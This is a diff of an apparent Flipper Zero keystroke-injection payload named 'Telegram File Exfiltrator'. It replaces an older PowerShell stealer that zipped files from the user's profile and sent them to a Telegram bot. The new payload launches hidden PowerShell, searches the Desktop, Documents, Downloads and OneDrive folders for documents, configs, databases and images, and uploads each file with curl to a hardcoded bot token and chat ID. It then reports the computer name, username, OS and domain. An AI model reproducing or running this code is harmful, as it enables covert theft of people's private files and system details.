@@ -1,68 +1,130 @@
-﻿$Token = "$tg"
-$URL='https://api.telegram.org/bot{0}' -f $Token 
+REM Name: Telegram File Exfiltrator
+REM Author: RFX/AOIRUSRA
+REM Description: Отправка файлов через Telegram API
+REM Target: Windows 10/11
+REM Delay: 100ms
+REM Repeat: 1
 
-while($chatID.length -eq 0){
-$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
-if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
-if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
-Sleep 10
-}
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -WindowStyle Hidden -Command "
+(
+# Telegram Configuration
+`$Token = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
+`$ChatID = '6614794141'
+`$BaseURL = 'https://api.telegram.org/bot' + `$Token
 
-Function Exfiltrate {
+# Initialization
+`$StartTime = Get-Date
+Write-Host '[+] Flipper Zero Telegram Exfiltration' -ForegroundColor Cyan
+Write-Host '[+] Token: ' `$Token -ForegroundColor Yellow
+Write-Host '[+] Chat ID: ' `$ChatID -ForegroundColor Yellow
 
-param ([string[]]$FileType,[string[]]$Path)
-$maxZipFileSize = 50MB
-$currentZipSize = 0
-$index = 1
-$zipFilePath ="$env:temp/Loot$index.zip"
-$MessageToSend = New-Object psobject 
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME : Exfiltration Started." -Force
-irm -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
+# Send start message
+`$StartMessage = `$env:COMPUTERNAME + ' | ' + `$env:USERNAME + ' | ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+`$StartBody = @{chat_id = `$ChatID; text = `$StartMessage} | ConvertTo-Json
+Invoke-RestMethod -Method Post -Uri (``"`$BaseURL/sendMessage``") -Body `$StartBody -ContentType 'application/json'
 
-If($Path -ne $null){
-$foldersToSearch = "$env:USERPROFILE\"+$Path
-}else{
-$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
-}
+# File search configuration
+`$SearchFolders = @(
+    ``"`$env:USERPROFILE\Desktop``",
+    ``"`$env:USERPROFILE\Documents``",
+    ``"`$env:USERPROFILE\Downloads``",
+    ``"`$env:USERPROFILE\OneDrive``"
+)
 
-If($FileType -ne $null){
-$fileExtensions = "*."+$FileType
-}else {
-$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
-}
+`$FilePatterns = @(
+    '*.txt', '*.log', '*.pdf', '*.doc', '*.docx',
+    '*.xls', '*.xlsx', '*.csv', '*.cfg', '*.conf',
+    '*.ini', '*.json', '*.xml', '*.sql', '*.db',
+    '*.jpg', '*.jpeg', '*.png'
+)
 
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
-$escmsg = "Files from : "+$env:COMPUTERNAME
+# Maximum file size (Telegram limit: 50MB)
+`$MaxFileSize = 45MB
 
-foreach ($folder in $foldersToSearch) {
-    foreach ($extension in $fileExtensions) {
-        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
-        foreach ($file in $files) {
-            $fileSize = $file.Length
-            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
-                $zipArchive.Dispose()
-                $currentZipSize = 0
-                curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
-                Remove-Item -Path $zipFilePath -Force
-                Sleep 1
-                $index++
-                $zipFilePath ="$env:temp/Loot$index.zip"
-                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+# Collect and send files
+`$TotalFiles = 0
+`$SentFiles = 0
+`$FailedFiles = 0
+
+foreach (`$Folder in `$SearchFolders) {
+    if (Test-Path `$Folder) {
+        Write-Host '[+] Searching: ' `$Folder -ForegroundColor Green
+        
+        foreach (`$Pattern in `$FilePatterns) {
+            `$Files = Get-ChildItem -Path `$Folder -Filter `$Pattern -File -Recurse -ErrorAction SilentlyContinue
+            
+            foreach (`$File in `$Files) {
+                `$TotalFiles++
+                
+                # Check file size
+                if (`$File.Length -lt `$MaxFileSize) {
+                    try {
+                        # Send file via curl
+                        `$Result = curl.exe -s -F ``"chat_id=`$ChatID``" -F ``"document=@`$(`$File.FullName)``" ``"`$BaseURL/sendDocument``"
+                        
+                        if (`$LASTEXITCODE -eq 0) {
+                            `$SentFiles++
+                            Write-Host '[+] Sent: ' `$File.Name -ForegroundColor Green
+                        } else {
+                            `$FailedFiles++
+                            Write-Host '[-] Failed: ' `$File.Name -ForegroundColor Red
+                        }
+                        
+                        # Rate limiting
+                        Start-Sleep -Milliseconds 500
+                        
+                    } catch {
+                        `$FailedFiles++
+                        Write-Host '[-] Error: ' `$_.Exception.Message -ForegroundColor Red
+                    }
+                } else {
+                    Write-Host '[-] Skipped (too large): ' `$File.Name -ForegroundColor Yellow
+                }
             }
-            $entryName = $file.FullName.Substring($folder.Length + 1)
-            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
-            $currentZipSize += $fileSize
         }
     }
 }
-$zipArchive.Dispose()
-curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
-Remove-Item -Path $zipFilePath -Force
-Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
-}
 
+# Send system information
+`$SystemInfo = @'
+Host Information:
+- Computer: {0}
+- Username: {1}
+- OS: {2}
+- Architecture: {3}
+- Domain: {4}
 
-# Define What you want to search for (examples at the top)
-Exfiltrate
+File Statistics:
+- Total found: {5}
+- Successfully sent: {6}
+- Failed: {7}
+- Duration: {8}
+'@ -f `$env:COMPUTERNAME,
+       `$env:USERNAME,
+       (Get-CimInstance Win32_OperatingSystem).Caption,
+       `$env:PROCESSOR_ARCHITECTURE,
+       `$env:USERDOMAIN,
+       `$TotalFiles,
+       `$SentFiles,
+       `$FailedFiles,
+       ((Get-Date) - `$StartTime).ToString('hh\:mm\:ss')
+
+`$InfoBody = @{chat_id = `$ChatID; text = `$SystemInfo} | ConvertTo-Json
+Invoke-RestMethod -Method Post -Uri (``"`$BaseURL/sendMessage``") -Body `$InfoBody -ContentType 'application/json'
+
+# Cleanup and exit
+Write-Host '[!] Exfiltration complete' -ForegroundColor Cyan
+Write-Host '[!] Total files processed: ' `$TotalFiles -ForegroundColor White
+Write-Host '[!] Files sent: ' `$SentFiles -ForegroundColor Green
+Write-Host '[!] Files failed: ' `$FailedFiles -ForegroundColor Red
+Write-Host '[!] Duration: ' ((Get-Date) - `$StartTime) -ForegroundColor White
+
+# Optional: Self-destruct or cleanup
+Start-Sleep -Seconds 2
+)
+"
+DELAY 100
+ENTER
